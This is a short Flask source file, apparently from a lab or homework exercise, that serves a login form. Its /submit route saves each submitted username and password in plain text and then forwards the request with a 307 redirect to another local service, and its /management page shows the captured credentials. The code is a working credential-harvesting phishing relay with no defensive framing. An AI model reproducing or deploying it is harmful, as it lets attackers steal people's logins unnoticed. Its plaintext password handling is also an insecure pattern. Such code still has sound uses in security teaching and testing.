from flask import Flask, render_template, request, redirect


app = Flask(__name__)


url = 'http://localhost:2222/'


@app.route("/")
def index():
    return render_template("Q4.html")


@app.route("/management")
def management():
    with open('input.txt', 'r') as f:
        content = f.read().splitlines()
    username = content[0]
    password = content[1]
    return render_template("management.html", username=username, password=password)


@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    with open("input.txt", "w") as file:
        file.write(f"Username: {username}\nPassword: {password}\n")
    return redirect(url, 307)


if __name__ == "__main__":
    app.run()